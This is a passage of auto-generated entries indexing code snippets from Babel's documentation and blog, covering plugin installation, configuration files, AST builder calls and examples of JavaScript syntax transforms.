https://github.com/babel/website/blob/main/website/data/tools/babel_node_debug/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install -g babel-node-debug\n```\n\n----------------------------------------\n\nTITLE: Install Webpacker - Shell\nDESCRIPTION: These shell commands install the Webpacker gem and then run the Webpacker installation script for Rails.  `bundle install` installs the gem dependencies. `bundle exec rails webpacker:install` sets up the necessary configuration files and directory structure for Webpacker to integrate with the Rails application.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/rails/install.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nbundle install\nbundle exec rails webpacker:install\n```\n\n----------------------------------------\n\nTITLE: Transform Import Attributes to Assertions Plugin (JSON)\nDESCRIPTION: Enables the `@babel/plugin-proposal-import-attributes-to-assertions` plugin. This plugin transforms import attributes to import assertions for compatibility with older runtimes.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-05-26-7.22.0.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"plugins\": [\n-    \"@babel/syntax-import-assertions\",\n+    \"@babel/plugin-proposal-import-attributes-to-assertions\"\n   ]\n }\n```\n\n----------------------------------------\n\nTITLE: Transform with Node API\nDESCRIPTION: This code snippet shows how to use the Babel Node API to transform JavaScript code with the @babel/plugin-transform-computed-properties plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-computed-properties\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin - Shell\nDESCRIPTION: Installs the `@babel/plugin-transform-dotall-regex` plugin using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dotall-regex.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-dotall-regex\n```\n\n----------------------------------------\n\nTITLE: Partial Application in Babel 7\nDESCRIPTION: Illustrates partial application syntax in Babel 7 for pre-filling arguments to a function.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_36\n\nLANGUAGE: javascript\nCODE:\n```\nf(?, a)\n```\n\n----------------------------------------\n\nTITLE: Binary and Octal Literals JavaScript\nDESCRIPTION: This code demonstrates the use of binary and octal literals in JavaScript. It shows how to represent numbers in base-2 and base-8 using the `0b` and `0o` prefixes, respectively. Babel only supports the literal form, not `Number(\"0o767\")`.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_30\n\nLANGUAGE: JavaScript\nCODE:\n```\n0b111110111 === 503 // true\n0o767 === 503 // true\n```\n\n----------------------------------------\n\nTITLE: Installing babel-helper-remove-or-void with npm\nDESCRIPTION: This command installs the babel-helper-remove-or-void package as a development dependency using npm. It adds the package to your project's package.json file under `devDependencies`.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-remove-or-void.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-helper-remove-or-void --save-dev\n```\n\n----------------------------------------\n\nTITLE: Path Ancestry Utilities Usage (JavaScript)\nDESCRIPTION: This snippet demonstrates how to use `path.isAncestor` and `path.isDescendant` to check the relationship between two paths in the AST. It uses `traverse` to find the Program and Number paths and then checks if one is an ancestor or descendant of the other.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet programPath, numberPath;\ntraverse(ast, {\n  Program(path) { programPath = path; },\n  NumberPath(path) { numberPath = path; },\n});\n\nprogramPath.isAncestor(numberPath); // true\nnumberPath.isDescendant(programPath); // true\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTypeParameter Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTypeParameter` AST node using Babel's `t.tsTypeParameter` method. It accepts constraint, default, and name as arguments. The 'const' property is not included in the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_215\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTypeParameter(constraint, default, name);\n```\n\n----------------------------------------\n\nTITLE: Smart Pipeline - Topic Style\nDESCRIPTION: This JavaScript code demonstrates the \"topic style\" of Smart Pipelines, where a placeholder is required in the pipeline step. This is mandatory for expressions containing operators, parentheses, or anything other than identifiers and dot punctuators.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-19-whats-happening-with-the-pipeline-proposal.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\n10 |> # + 1;\npromise |> await #;\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via CLI\nDESCRIPTION: This shell command demonstrates how to use the plugin via the Babel CLI by specifying the `--plugins` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-environment-variables.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-inline-environment-variables script.js\n```\n\n----------------------------------------\n\nTITLE: Async Generator Function Transformation - Input\nDESCRIPTION: This JavaScript code defines an async generator function named `agf` that awaits a value and then yields another. The plugin will transform this into compatible code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function* agf() {\n  await 1;\n  yield 2;\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Uses the `@babel/plugin-syntax-function-sent` plugin via the Node API.  This allows for programmatic transformation of code strings.  Requires `@babel/core` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-function-sent.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-function-sent\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Babel CLI Globally (Shell)\nDESCRIPTION: This command installs the Babel CLI globally using npm. This is necessary to run the `babel-doctor` command and diagnose potential issues with a Babel setup.  It installs a version of babel-cli greater than or equal to 6.1.0.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-11-03-babel-doctor.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm install -g babel-cli@^6.1.0\n```\n\n----------------------------------------\n\nTITLE: Adding Arrow Functions Plugin to .babelrc\nDESCRIPTION: Demonstrates how to add the `transform-es2015-arrow-functions` plugin to the `.babelrc` configuration file. This plugin enables Babel to compile ES2015 arrow functions into ES5 compatible code. The plugin must first be installed via npm.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\"transform-es2015-arrow-functions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Demonstrates how to use the `@babel/plugin-proposal-do-expressions` plugin programmatically via the Node API. It transforms the provided code string with the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-do-expressions.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-do-expressions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/helper-validator-identifier\nDESCRIPTION: This command installs the @babel/helper-validator-identifier package using npm or yarn. It adds the package to your project's dependencies, allowing you to use its functions for identifier validation.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-validator-identifier.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/helper-validator-identifier\n```\n\n----------------------------------------\n\nTITLE: Install Babel Preset ES2015\nDESCRIPTION: Installs the @babel/preset-es2015 package as a development dependency using npm. This command is used to add the preset to your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2015.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/preset-es2015\n```\n\n----------------------------------------\n\nTITLE: Class property initializers in shadow-functions (JavaScript)\nDESCRIPTION: This snippet illustrates how class property initializers are handled within shadow functions. It addresses special cases for class properties, both static and instance, that use arrow functions referencing `this` or `arguments`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass A {\n  prop1 = () => this;\n  static prop2 = () => this;\n  prop3 = () => arguments;\n}\n```\n\n----------------------------------------\n\nTITLE: Migrating from @babel/highlight - Without forceColor\nDESCRIPTION: Illustrates migrating from `@babel/highlight` to `@babel/code-frame` when not using the `forceColor` option.  It takes into account if the stdout supports colors.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nimport highlight from \"@babel/highlight\";\n\nhighlight(text);\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport { highlight } from \"@babel/code-frame\";\n\nprocess.stdout.hasColors() ? highlight(text) : text;\n```\n\n----------------------------------------\n\nTITLE: Launch a REPL using babel-node without installing it\nDESCRIPTION: Launches a Read-Eval-Print-Loop (REPL) using babel-node without requiring a prior install by utilizing the 'npx' command to install them on-the-fly.\nSOURCE: https://github.com/babel/website/blob/main/docs/node.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpx -p @babel/core -p @babel/node babel-node\n```\n\n----------------------------------------\n\nTITLE: CLI: Babel Plugin Usage\nDESCRIPTION: This command demonstrates how to use the babel-plugin-minify-mangle-names plugin via the Babel CLI. It transforms `script.js` using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-mangle-names.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins minify-mangle-names script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a TS Conditional Type Node in Babel\nDESCRIPTION: Creates a `TSConditionalType` AST node using the Babel types module. This node represents a conditional type in TypeScript, requiring check type, extends type, true type, and false type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_164\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsConditionalType(checkType, extendsType, trueType, falseType);\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin in babel.config.json\nDESCRIPTION: This JSON configuration adds the `@babel/plugin-syntax-optional-catch-binding` plugin to the Babel configuration file.  This enables the plugin to be used when transpiling JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-catch-binding.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-optional-catch-binding\"]\n}\n```\n\n----------------------------------------\n\nTITLE: classCallCheck helper with useESModules enabled - JavaScript\nDESCRIPTION: Example of the `classCallCheck` helper function generated by Babel when `useESModules` is enabled.  This demonstrates the ES module format, which can lead to smaller bundle sizes in module systems like Webpack.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nexport default function(instance, Constructor) {\n  if (!(instance instanceof Constructor)) {\n    throw new TypeError(\"Cannot call a class as a function\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Optional Chaining Assignment in Babel 7\nDESCRIPTION: Demonstrates optional chaining assignment in Babel 7. It prevents errors when trying to access or assign to properties on potentially null or undefined values.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_35\n\nLANGUAGE: javascript\nCODE:\n```\nx?.prop = 2\n```\n\n----------------------------------------\n\nTITLE: Creating an AwaitExpression Node\nDESCRIPTION: Creates an AST node representing an await expression. Requires the `argument` parameter, which is an `Expression`. Use `t.isAwaitExpression(node, opts)` to check if a node is an AwaitExpression and `t.assertAwaitExpression(node, opts)` to assert that a node is an AwaitExpression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.awaitExpression(argument);\n```\n\n----------------------------------------\n\nTITLE: Checking for EnumMember Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is an EnumMember node using the `t.isEnumMember(node)` method in Babel. This method applies to Flow enum members and covers EnumBooleanMember, EnumDefaultedMember, EnumNumberMember, and EnumStringMember. It allows identifying individual members within an enum declaration.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_262\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isEnumMember(node);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSVoidKeyword Node in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `TSVoidKeyword` AST node using Babel's `t.tsVoidKeyword` method. No arguments are required for this method.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_224\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsVoidKeyword();\n```\n\n----------------------------------------\n\nTITLE: Karma Configuration with Babel Preprocessor in JavaScript\nDESCRIPTION: Configures Karma to use the Babel preprocessor for transpiling JavaScript files.  It defines the files to be included, the preprocessors to be applied (babel), and babelPreprocessor options. The babelPreprocessor options include the '@babel/preset-env' preset and specifies 'inline' for sourceMap generation.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/karma/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = function(config) {\n  config.set({\n    files: [\n      \"src/**/*.js\",\n      \"test/**/*.js\"\n    ],\n    preprocessors: {\n      \"src/**/*.js\": [\"babel\"],\n      \"test/**/*.js\": [\"babel\"]\n    },\n    \"babelPreprocessor\": {\n      // options go here\n      options: {\n        presets: [\"@babel/preset-env\"],\n        sourceMap: \"inline\"\n      },\n    }\n  });\n};\n```\n\n----------------------------------------\n\nTITLE: Creating ExportNamedDeclaration in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExportNamedDeclaration` AST node using Babel's `t.exportNamedDeclaration` method. The `declaration` (a `Declaration`), `specifiers` (an array of export specifiers), and `source` (`StringLiteral`) parameters can be optionally provided. The `assertions`, `attributes`, and `exportKind` are optional and excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_64\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.exportNamedDeclaration(declaration, specifiers, source);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin: Shell\nDESCRIPTION: This command installs the `@babel/plugin-transform-reserved-words` plugin as a development dependency using npm. It is required to be installed before it can be used.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-reserved-words.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-reserved-words\n```\n\n----------------------------------------\n\nTITLE: Proxying a Function Object JavaScript\nDESCRIPTION: This code snippet demonstrates how to create a proxy for a function object. It intercepts function calls and returns a custom string. It uses the `Proxy` constructor with a target function and a handler object.  Proxies are not transpiled or polyfilled due to ES5 limitations.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_25\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Proxying a function object\nvar target = function () { return \"I am the target\"; };\nvar handler = {\n  apply: function (receiver, ...args) {\n    return \"I am the proxy\";\n  }\n};\n\nvar p = new Proxy(target, handler);\np() === \"I am the proxy\";\n```\n\n----------------------------------------\n\nTITLE: Creating ExistsTypeAnnotation in JavaScript\nDESCRIPTION: This snippet shows how to create an `ExistsTypeAnnotation` AST node using Babel's `t.existsTypeAnnotation` method. This node is used in Flow type annotations to represent the `*` type.  No parameters are required.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_60\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.existsTypeAnnotation();\n```\n\n----------------------------------------\n\nTITLE: Checking for ExpressionWrapper Nodes in JavaScript\nDESCRIPTION: This code snippet demonstrates how to check if a given AST node is an ExpressionWrapper node using the `t.isExpressionWrapper(node)` method in Babel. It covers ExpressionStatement, ParenthesizedExpression, and TypeCastExpression. This method identifies expressions that wrap other expressions without adding runtime semantics.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_265\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isExpressionWrapper(node);\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Configuration for Class Static Blocks\nDESCRIPTION: This configuration shows how to enable the class static blocks proposal in Babel using the `@babel/plugin-proposal-class-static-block` plugin. It's important to place this plugin before other class feature plugins to ensure proper transformation order.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-proposal-class-static-block\",\n    \"@babel/plugin-proposal-class-properties\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Destructuring and Spread Attributes in React\nDESCRIPTION: Shows how to use ES6 destructuring and JSX spread attributes to pass down props to child components.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nclass AutoloadingPostsGrid extends React.Component {\n  render() {\n    const {\n      className,\n      ...others  // contains all properties of this.props except for className\n    } = this.props;\n    return (\n      <div className={className}>\n        <PostsGrid {...others} />\n        <button onClick={this.handleLoadMoreClick}>Load more</button>\n      </div>\n    );\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retaining return types on ObjectMethods (JavaScript)\nDESCRIPTION: This code snippet demonstrates how return types are retained on ObjectMethods when using transform-es2015-shorthand-properties. It shows the flow type annotations being preserved during transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_21\n\nLANGUAGE: JavaScript\nCODE:\n```\n// @flow\nvar obj = {\n  method(a: string): number {\n    return 5 + 5;\n  }\n};\n```\n\n----------------------------------------\n\nTITLE: Usage via CLI\nDESCRIPTION: This command demonstrates how to use the plugin via the Babel CLI. It transforms a file named script.js.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-strict-mode.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-strict-mode script.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin (npm/yarn)\nDESCRIPTION: Installs the @babel/plugin-syntax-partial-application plugin as a development dependency using npm or yarn. This allows parsing of the partial application syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-partial-application.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-partial-application\n```\n\n----------------------------------------\n\nTITLE: Run Babel with CLI\nDESCRIPTION: This shell command demonstrates how to use the Babel CLI to transpile a JavaScript file (script.js) using the specified plugin. The '--plugins' option specifies the plugins to use during transpilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-unicode-sets-regex.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-unicode-sets-regex script.js\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Spread Attribute in JavaScript\nDESCRIPTION: This snippet creates a `JSXSpreadAttribute` AST node using Babel's `t.jsxSpreadAttribute` builder. The `argument` parameter is an `Expression`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_105\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxSpreadAttribute(argument);\n```\n\n----------------------------------------\n\nTITLE: Configuring RequireJS paths for Babel and plugins (JavaScript)\nDESCRIPTION: This snippet shows how to configure the `paths` option in RequireJS to point to the necessary modules for Babel and the requirejs-babel plugin. This allows RequireJS to locate these modules when they are required.  The configuration includes paths for 'es6', 'babel', and 'babel-plugin-module-resolver'.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/requirejs/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\npaths: {\n    es6: '...node_modules/requirejs-babel/es6',\n    babel: '...node_modules/@babel/standalone/babel.min',\n    'babel-plugin-module-resolver': '...node_modules/babel-plugin-module-resolver-standalone/index'\n  }\n```\n\n----------------------------------------\n\nTITLE: Creating a BigIntLiteral Node\nDESCRIPTION: Creates an AST node representing a BigInt literal. Requires the `value` parameter, which is a string representation of the BigInt. Use `t.isBigIntLiteral(node, opts)` to check if a node is a BigIntLiteral and `t.assertBigIntLiteral(node, opts)` to assert that a node is a BigIntLiteral.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.bigIntLiteral(value);\n```\n\n----------------------------------------\n\nTITLE: Constant Elements Usage with Babel CLI Shell\nDESCRIPTION: Shows how to enable the `constantElements` optimization for React in Babel using the command-line interface (CLI) with the `--optional` flag.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\n$ babel --optional optimisation.react.constantElements script.js\n```\n\n----------------------------------------\n\nTITLE: Supporting ObjectExpression in Static Path Evaluation (JavaScript)\nDESCRIPTION: This example showcases the support for `ObjectExpression` in static path evaluation, which is useful for Babel plugins like babel/babili.  The snippet shows how an object expression with computed properties can be evaluated during compilation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// in\n{['a' + 'b']: 10 * 20, 'z': [1, 2, 3]}\n// out\n{ab: 200, z: [1, 2, 3]}\n```\n\n----------------------------------------\n\nTITLE: Flow Type Annotations Example (Output)\nDESCRIPTION: This example demonstrates how the Babel plugin transforms Flow type annotations into comments in the output JavaScript code, preserving the Flow types while making the code compatible with environments that don't support Flow natively.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-comments.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nfunction foo(bar /*:: ?*/) {}\nfunction foo2(bar /*:: ?: string*/) {}\nfunction foo(x /*: number*/) /*: string*/ {}\n/*:: type B = {\n  name: string;\n};*/\n/*:: export type GraphQLFormattedError = number;*/\n/*:: import type A, { B, C } from './types';*/\n/*:: import typeof D, { E, F } from './types';*/\n```\n\n----------------------------------------\n\nTITLE: Requiring core-js polyfills\nDESCRIPTION: This YAML configuration shows how to require both `core-js` (for polyfills) and `@babel/register` in the correct order for Mocha. Requiring `core-js` before `@babel/register` ensures that polyfills are loaded before any ES6+ code is transpiled. This ensures full compatibility with older environments.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/mocha/usage.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nrequire:\n  - 'core-js'\n  - '@babel/register'\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Fragment in JavaScript\nDESCRIPTION: This snippet creates a `JSXFragment` AST node using Babel's `t.jsxFragment` builder.  It requires `openingFragment` (JSXOpeningFragment), `closingFragment` (JSXClosingFragment), and `children` (array of JSXText, JSXExpressionContainer, JSXSpreadChild, JSXElement, or JSXFragment).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_99\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxFragment(openingFragment, closingFragment, children);\n```\n\n----------------------------------------\n\nTITLE: Invalid Super() Call in JavaScript Constructor\nDESCRIPTION: This JavaScript code shows an invalid `super()` call within the constructor of a non-derived class, which is disallowed in Babel v5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-03-31-5.0.0.md#_snippet_19\n\nLANGUAGE: javascript\nCODE:\n```\nclass Foo {\n  constructor() {\n    super(); // not in a derived constructor\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin with babel.config.json\nDESCRIPTION: Example of configuring the `@babel/plugin-proposal-partial-application` plugin in a `babel.config.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-partial-application\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Preset Env Spec Configuration JSON\nDESCRIPTION: This JSON configuration represents the equivalent of `@babel/preset-env`'s `spec` option. It only sets the `noNewArrows` assumption to false, ensuring stricter adherence to the ECMAScript specification.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_25\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"],\n  \"assumptions\": {\n    \"noNewArrows\": false\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Reserved Words: JavaScript Example\nDESCRIPTION: This code snippet demonstrates how the `@babel/plugin-transform-reserved-words` plugin transforms JavaScript code containing ES3 reserved words. The `abstract` variable is renamed to `_abstract` to avoid conflicts in ES3 environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-reserved-words.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar abstract = 1;\nvar x = abstract + 1;\n```\n\n----------------------------------------\n\nTITLE: Configuring metalsmith-babel via CLI in metalsmith.json\nDESCRIPTION: This snippet demonstrates how to configure the metalsmith-babel plugin using the CLI by adding it to the plugins section of the `metalsmith.json` file. It specifies the Babel presets to be used for transpilation. The expected input is a valid `metalsmith.json` file. The output is transpiled JavaScript files in the Metalsmith build directory.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/metalsmith/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": {\n    \"metalsmith-babel\": {\n      // babel options\n      \"presets\": [\"@babel/preset-env\"]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via CLI\nDESCRIPTION: This command shows how to use the plugin directly from the command line when running the babel executable. The script.js file is the file to be transpiled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-explicit-resource-management.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-explicit-resource-management script.js\n```\n\n----------------------------------------\n\nTITLE: Annotate as Pure Declaration JavaScript\nDESCRIPTION: Declares the `annotateAsPure` function, which accepts a Node or NodePath as an argument.  This function is used to mark nodes as pure, allowing minifiers to safely remove them if they are not used.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-annotate-as-pure.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ndeclare export default annotateAsPure(nodeOrPath: Node | NodePath);\n```\n\n----------------------------------------\n\nTITLE: Checking for ObjectMember Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a member within an object literal. It uses the `t.isObjectMember(node)` method from Babel's `types` API. This covers nodes such as `ObjectMethod` and `ObjectProperty`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_285\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isObjectMember(node);\n```\n\n----------------------------------------\n\nTITLE: Configuring plugin without options in babel config\nDESCRIPTION: Configures the babel-plugin-transform-remove-console plugin within a Babel configuration file (e.g., .babelrc or babel.config.js). The plugin is enabled without any specific options, removing all console statements by default.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-console.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-remove-console\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Deprecated Import Assert in Babel 8\nDESCRIPTION: Demonstrates the deprecated import assert syntax (legacy import attributes) within Babel 8 for specifying module types. It associates metadata with import statements.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nimport json from \"./foo.json\" assert { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Qualified Name\nDESCRIPTION: Creates a TypeScript qualified name node in the AST. Represents a qualified name like `A.B`, where `A` is a namespace or module.  Requires the left and right parts of the qualified name.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_202\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsQualifiedName(left, right);\n```\n\n----------------------------------------\n\nTITLE: Configuring Webpack with Babili Webpack Plugin\nDESCRIPTION: This snippet shows how to configure Webpack to use the `babili-webpack-plugin`.  This plugin offers a more integrated and potentially optimized way to use Babili within a Webpack build process. Options can be passed to the plugin to customize its behavior.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\n// webpack.config.js\nconst BabiliPlugin = require(\"babili-webpack-plugin\");\nmodule.exports = {\n  entry: //...,\n  output: //...,\n  plugins: [\n    new BabiliPlugin(options)\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via CLI\nDESCRIPTION: This command executes Babel with the `@babel/plugin-transform-literals` plugin, processing the `script.js` file. It requires Babel CLI to be installed globally or locally. The output is transformed code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-literals.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-literals script.js\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via NPM\nDESCRIPTION: This shell command installs the babel-plugin-minify-dead-code-elimination plugin as a development dependency using npm. The --save-dev flag ensures that the plugin is added to the project's devDependencies.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-dead-code-elimination.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-dead-code-elimination --save-dev\n```\n\n----------------------------------------\n\nTITLE: Export Namespace From\nDESCRIPTION: This JavaScript code snippet demonstrates the use of the `export * as ns from 'mod'` syntax, which is transformed by the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-export-namespace-from.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport * as ns from 